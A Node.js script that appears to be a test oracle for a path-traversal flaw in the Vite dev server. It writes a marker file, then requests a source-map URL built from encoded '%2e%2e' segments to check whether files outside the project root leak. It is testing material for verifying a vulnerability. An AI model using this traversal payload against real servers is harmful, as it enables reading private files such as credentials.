const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const vite = require('vite');
    if (!vite || typeof vite.createServer !== 'function') {
      throw new Error('vite.createServer unavailable');
    }

    const base = path.join(os.tmpdir(), 'vite-map-traversal-oracle-' + Date.now() + '-' + Math.random().toString(16).slice(2));
    const root = path.join(base, 'project');
    const depsDir = path.join(root, 'node_modules', '.vite', 'deps');
    const markerFile = path.join(base, 'leak-target.txt');

    fs.mkdirSync(depsDir, { recursive: true });
    fs.writeFileSync(path.join(root, 'index.html'), '<!doctype html><html><body>ok</body></html>');

    const benignMap = '{"version":3,"file":"safe.js","sources":[],"names":[],"mappings":""}';
    fs.writeFileSync(path.join(depsDir, 'safe.js.map'), benignMap);
    fs.writeFileSync(markerFile, 'VITE_TRAVERSAL_SECRET_MARKER');

    const server = await vite.createServer({
      root,
      logLevel: 'silent',
      appType: 'custom',
      server: { middlewareMode: true },
      optimizeDeps: { disabled: true }
    });

    const request = (url) => new Promise((resolve) => {
      const req = { method: 'GET', url, headers: {} };
      const chunks = [];
      const res = {
        statusCode: 200,
        headers: {},
        setHeader(name, value) { this.headers[String(name).toLowerCase()] = value; },
        getHeader(name) { return this.headers[String(name).toLowerCase()]; },
        writeHead(code, headers) {
          this.statusCode = code;
          if (headers && typeof headers === 'object') {
            for (const k of Object.keys(headers)) this.setHeader(k, headers[k]);
          }
        },
        write(data) {
          if (data) chunks.push(Buffer.isBuffer(data) ? data : Buffer.from(String(data)));
          return true;
        },
        end(data) {
          if (data) chunks.push(Buffer.isBuffer(data) ? data : Buffer.from(String(data)));
          resolve({ statusCode: this.statusCode || 200, body: Buffer.concat(chunks).toString('utf8') });
        }
      };
      server.middlewares(req, res, () => resolve({ statusCode: 404, body: '' }));
    });

    try {
      const benign = await request('/node_modules/.vite/deps/safe.js.map');
      if (benign.statusCode >= 400 || benign.body.indexOf('"version":3') === -1) {
        throw new Error('benign request failed status=' + benign.statusCode + ' body=' + benign.body.slice(0, 80));
      }

      operation_completed = true;

      const maliciousUrl = '/node_modules/.vite/deps/%2e%2e/%2e%2e/%2e%2e/%2e%2e/leak-target.txt.map';
      const malicious = await request(maliciousUrl);
      const leaked = malicious.body.includes('VITE_TRAVERSAL_SECRET_MARKER');

      exploit_succeeded = leaked;
      evidence = 'benign_status=' + benign.statusCode + ';malicious_status=' + malicious.statusCode + ';leaked=' + leaked;
    } finally {
      await server.close();
    }
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'exception=' + (e && e.message ? e.message : String(e));
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();